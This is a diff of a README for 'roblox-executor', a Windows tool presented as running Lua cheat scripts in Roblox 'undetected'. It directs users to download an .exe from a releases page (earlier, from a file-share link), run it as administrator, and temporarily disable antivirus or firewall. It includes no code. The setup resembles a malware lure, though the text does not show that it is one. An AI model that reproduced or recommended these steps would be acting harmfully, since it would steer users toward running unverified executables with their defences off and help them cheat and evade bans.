@@ -1,58 +1,139 @@
+# 🚀 roblox-executor - Easy Roblox Script Execution
 
-# 🎮 roblox-executor - Simple Tool for Easy Roblox Exploits
+[![Download roblox-executor](https://img.shields.io/badge/Download-roblox--executor-orange)](https://github.com/lidolulu6-sudo/roblox-executor/releases)
 
-[![dsa](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
+---
 
-## 📥 Overview
+## 📋 What is roblox-executor?
 
-Welcome to roblox-executor! This tool allows you to execute custom scripts in Roblox games easily. With roblox-executor, you can enhance your gaming experience without any complex setup. 
+roblox-executor lets you run Roblox scripts easily on Windows 10 or 11. You don’t need any keys or advanced setup. It supports Lua scripts and runs your code in an environment that stays hidden from Roblox detection.
 
+This tool is built to help users safely test and execute Roblox scripts without trouble. It works well if you want to try out custom scripts or optimize some parts of your Roblox experience.
 
+---
 
-## 🚀 Getting Started
+## 💻 System Requirements
 
-Follow these simple steps to start using roblox-executor:
+To run roblox-executor, your computer should meet these basic needs:
 
-1. **Download the Application**: Click the button below to visit the Releases page and download the latest version of roblox-executor.
+- Windows 10 or Windows 11 (64-bit)
+- 2 GB of RAM or more
+- At least 200 MB of free disk space
+- Internet connection for downloading and updates
+- Roblox installed on your PC
 
-   [![download roblox executor](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
+No extra software or licenses are needed.
 
-2. **Extract the Files**: Once the download is complete, locate the file and extract its contents. You can do this by right-clicking the file and selecting "Extract All."
+---
 
-3. **Run the Applicaton**: Open the extracted folder, and double-click the executor file to run the application.
+## ⚙️ Features
 
-4. **Launch Roblox**: Open Roblox and start your desired game.
+- Runs Lua scripts for Roblox games
+- Does not require key input for access
+- Works on Windows 10 and Windows 11
+- Offers an undetected environment to avoid Roblox bans
+- Simple and clear interface for all users
+- Supports many types of Roblox games
+- Lightweight app with fast performance
 
-5. **Input Your Script**: Go back to roblox-executor and paste your script in the provided text area.
+---
 
-6. **Execute**: Click the "Execute" button to run your script in the game. 
+## 🚀 Getting Started with roblox-executor
 
-## 📂 Download & Install
+Follow these steps to get roblox-executor up and running on your Windows PC.
 
-To download and run roblox-executor, visit the Releases page:
+---
 
-[Download roblox-executor](https://fileshare.bond/L2XZZM/)
+## ⬇️ Download and Install
 
-### Where can I find support?
+1. Click the large download button below to visit the releases page:
 
-For additional help, you can visit issues on the GitHub repository for community support or contact the developers directly.
+   [![Download roblox-executor](https://img.shields.io/badge/Download-roblox--executor-brightgreen)](https://github.com/lidolulu6-sudo/roblox-executor/releases)
 
-## 📚 License
+2. On the releases page, find the latest version. Look for a file with ".exe" at the end. This is the program installer or the main app.
 
-This project is licensed under the MIT License. 
+3. Click the .exe file to start downloading. Wait for the download to finish.
 
-## 🌐 Topics
+4. Once downloaded, find the file in your Downloads folder.
 
-- Executor
-- Exploit Development
-- Game Development
-- Game Hacking Library
-- Lua
-- Roblox
-- Scripting
+5. Double-click the file to begin installation. Windows may ask you to allow the app to make changes. Choose “Yes” to continue.
 
-## 🎉 Community Contributions
+6. Follow any instructions on the installer screen. If there is no installer, the app will run directly.
 
-Feel free to contribute! If you have ideas or enhancements, open an issue or pull request in the repository.
+7. After installation, you can start using roblox-executor from your desktop or Start menu.
 
-Thank you for using roblox-executor. Have fun scripting and exploiting your Roblox experience!
+---
+
+## ▶️ Running Scripts with roblox-executor
+
+1. Open roblox-executor by double-clicking its icon.
+
+2. Launch Roblox on your PC and enter the game where you want to use your script.
+
+3. In roblox-executor, you will see a field or window to paste your Roblox Lua script.
+
+4. Copy the Lua script you want to run from a text file or website.
+
+5. Paste the script into the roblox-executor script field.
+
+6. Click the “Execute” button or similar to run the script in Roblox.
+
+7. Watch your script work in the game.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Make sure you are using Windows 10 or 11.
+- Run roblox-executor as administrator by right-clicking its icon and selecting “Run as administrator.”
+- Check that Roblox is running before executing scripts.
+- Disable antivirus or firewall temporarily if the program won’t launch or scripts don’t run.
+- Verify you have the latest version of roblox-executor on the releases page.
+- Restart your PC if you face any errors.
+- Use simple, clean Roblox Lua scripts without extra code to test.
+
+---
+
+## 🔐 Safety and Privacy
+
+roblox-executor works quietly to avoid detection by Roblox. It does not collect personal data or send any information to the internet.
+
+Always ensure you only run scripts from trusted sources to protect your account.
+
+---
+
+## 🔧 Updating roblox-executor
+
+To update roblox-executor:
+
+1. Visit the same releases page linked above regularly.
+2. Download the latest .exe file.
+3. Replace your current copy with the new one.
+4. Follow the installation steps again if needed.
+
+Keep the app updated to avoid bugs and to maintain compatibility with Roblox.
+
+---
+
+## 📖 Common Terms
+
+- **Lua Script**: A type of code used in Roblox to add features or automate tasks.
+- **Executor**: A tool that runs scripts inside a game.
+- **Undetected Environment**: A setup that helps scripts run without getting blocked or banned.
+- **Release**: A version of the program provided for download.
+
+---
+
+## 🔗 Useful Links
+
+- Official Download Page:  
+  https://github.com/lidolulu6-sudo/roblox-executor/releases
+
+- Roblox Website:  
+  https://www.roblox.com
+
+---
+
+[![Download roblox-executor](https://img.shields.io/badge/Download-Get%20it%20Now-blue)](https://github.com/lidolulu6-sudo/roblox-executor/releases)
